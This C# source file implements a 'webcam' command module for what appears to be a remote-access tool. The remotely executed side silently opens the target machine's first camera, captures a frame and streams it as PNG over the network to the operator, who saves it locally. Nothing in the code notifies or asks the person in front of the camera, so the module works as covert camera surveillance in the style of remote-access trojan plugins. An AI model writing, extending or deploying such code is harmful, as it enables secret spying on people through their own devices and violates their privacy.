using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using NetworkManager;
using Shared;

namespace Commands
{
    internal class Webcam : ICommand
    {
        public string name { get; } = "webcam";

        public string description { get; } = "Webcam control utility, able to take pictures and record videos";

        public string syntaxHelper { get; } = "webcam [picture|video] [fileToWrite]";

        public bool isLocal { get; } = false;

        public List<List<Type>> validArguments { get; } = new List<List<Type>>()
        {
            new List<Type>(){typeof(string), typeof(string)}
        };

        public List<string> clientFlags { get; } = new List<string>()
        {
            "{Webcam:pic}",
            "{Webcam:video}"
        };

        public List<string> savedData { get; set; } = new List<string>();


        VideoCaptureDevice video { get; set; }


        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            var fileName = "webcamshot.png";

            // Get data length
            var dataLength = int.Parse(GlobalNetworkManager.ReadLine());

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    GlobalNetworkManager.ReadNetworkStreamAndWriteToStream(fs, 4096, dataLength);
                }

                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }

        public void ServerMethod(List<string> args)
        {
            GlobalNetworkManager.WriteLine(clientFlags[0]);

            var captureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice)[0];
            video = new VideoCaptureDevice(captureDevice.MonikerString);
            video.NewFrame += FinalVideo_NewFrame;
            video.Start();
            video.WaitForStop();
        }

        void FinalVideo_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            using (var ms = new MemoryStream())
            {
                eventArgs.Frame.Save(ms, ImageFormat.Png);

                // Send the data length first
                GlobalNetworkManager.WriteLine(ms.Length.ToString());

                // Reset memory stream position
                ms.Position = 0;
                GlobalNetworkManager.ReadStreamAndWriteToNetworkStream(ms, 4096);
            }

            video.SignalToStop();
        }
    }
}
